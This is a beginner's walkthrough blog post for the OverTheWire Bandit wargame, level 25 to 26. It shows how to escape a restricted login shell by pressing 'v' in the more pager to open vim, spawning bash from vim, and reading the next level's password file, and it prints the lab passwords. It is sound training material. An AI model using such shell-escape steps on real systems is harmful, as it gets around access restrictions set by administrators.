---
date: 2023-01-28 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Bandit Level 25 → 26 tutorial!!"
permalink: /posts/overTheWire-Bandit-Level-25-to-26/
tags: [overthewire, bandit, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Bandit Level 25 → 26!!"
---
<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Bandit level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Bandit-Level-24-to-25/' | relative_url }}">← Previous: Level 24 → 25</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/bandit/bandit26.html" target="_blank" rel="noopener">Official (Level 26) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Bandit-Level-26-to-27/' | relative_url }}">Next: Level 26 → 27 →</a>
  </div>
</nav>

## Login

Log in as **bandit25** using the password you obtained from Level 24 → 25.

```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
# password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
````

> Why? Each Bandit level is a separate UNIX user. To solve 25 → 26, you must be the `bandit25` user.

## Task

![Task placeholder]({{ '/assets/images/bandit/level-25-to-26/task.jpg' | relative_url }})

The home directory contains a **private SSH key** for `bandit26`.
However, the login shell of bandit26 is set to **`/usr/bin/showtext`**, which only runs the pager `more` on a file and then exits.
Your job is to figure out how to break out of this restricted environment and obtain the password for **bandit26**.

## A little bit of Theory

* **Shell override**: instead of `/bin/bash`, bandit26’s shell is `/usr/bin/showtext`.
* The script `/usr/bin/showtext` simply executes `more ~/text.txt`.
* **Pager trick**: when `more` is interactive (`--More--`), you can press **`v`** to launch **vim**.
* From vim, you can spawn a real shell with `:!bash`.

**Further reading:**

* <a href="https://man7.org/linux/man-pages/man1/more.1.html" target="_blank" rel="noopener">`more(1)` manual</a>
* <a href="https://www.vim.org/docs.php" target="_blank" rel="noopener">Vim documentation</a>

## Solution

1. **Inspect the home directory**

   ```bash
   ls -la
   ```

   *Why?* Confirms the presence of the `bandit26.sshkey` file needed to connect.

   ![ls placeholder]({{ '/assets/images/bandit/level-25-to-26/ls.jpg' | relative_url }})

2. **Check the shell of bandit26**

   ```bash
   grep '^bandit26:' /etc/passwd
   ```

   Output shows:

   ```
   bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
   ```

   *Why?* Confirms that bandit26 does not use `/bin/bash` but `/usr/bin/showtext`.

   ![passwd placeholder]({{ '/assets/images/bandit/level-25-to-26/passwd.jpg' | relative_url }})

3. **Inspect the showtext script**

   ```bash
   cat /usr/bin/showtext
   ```

   It runs:

   ```bash
   #!/bin/sh
   export TERM=linux
   exec more ~/text.txt
   exit 0
   ```

   *Why?* Shows that bandit26 will always be dropped into `more text.txt`.

   ![showtext placeholder]({{ '/assets/images/bandit/level-25-to-26/showtext.jpg' | relative_url }})

4. **Login as bandit26 with the SSH key**

   ```bash
   ssh -i bandit26.sshkey -p 2220 bandit26@localhost
   ```

   *Why?* Connects using the provided private key instead of a password.

   If your terminal is tall, `more` prints the whole file and exits immediately.
   → **Fix:** resize your terminal to \~10 lines tall so `more` shows `--More--`.

   ![ssh placeholder]({{ '/assets/images/bandit/level-25-to-26/ssh.jpg' | relative_url }})

5. **Escape into vim, then bash**

   * Inside `more`, press **`v`** → this opens vim.
   * In vim, type:

     ```
    :set shell=/bin/bash
    :shell
     ```

   *Why?* This spawns a new shell, giving you full access as bandit26.

   ![vim escape placeholder]({{ '/assets/images/bandit/level-25-to-26/vim.jpg' | relative_url }})

6. **Read the password**

   ```bash
   cat /etc/bandit_pass/bandit26
   ```

   Output:

   ```
   s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
   ```

   *Why?* Prints the password for the next level.

   ![password placeholder]({{ '/assets/images/bandit/level-25-to-26/password.jpg' | relative_url }})

## Password

> This is the password I got; copy yours from your own run.

```
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

**Troubleshooting**

* **Immediately disconnected?** → Shrink your terminal window so `more` pauses with `--More--`.
* **Can’t escape?** → Be sure you’re inside `more`. Press `v` to open vim, then `:!bash`.
* **Permission errors on ssh key** → Ignore; key is already properly restricted.

---

**Congrats 🎉** You successfully escaped a restricted shell using `more → vim → bash` and obtained the credentials for **bandit26**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

